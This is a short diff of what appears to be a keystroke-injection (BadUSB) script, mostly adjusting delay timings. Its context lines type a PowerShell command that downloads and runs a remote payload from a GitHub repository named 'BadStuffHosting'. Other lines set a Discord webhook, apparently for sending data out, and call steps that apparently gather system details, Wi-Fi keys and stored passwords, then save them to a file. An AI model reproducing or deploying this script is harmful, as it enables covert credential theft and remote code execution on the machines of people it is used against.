@@ -29,11 +29,12 @@ STRING $DiscordUrl = 'DISCORD_WEBHOOK'
 ENTER
 STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/W1ns1d3r/payload.ps1'))
 ENTER
-DELAY 500
+DELAY 1000
 STRING version-av
 ENTER
 STRING SysInfo
 ENTER
+DELAY 10000
 STRING Wifi
 ENTER
 STRING Get-Nirsoft
@@ -46,7 +47,7 @@ ENTER
 DELAY 3000
 CTRL A
 CTRL S
-DELAY 1000
+DELAY 2000
 STRING c:\temp\export.txt
 ENTER
 DELAY 1000
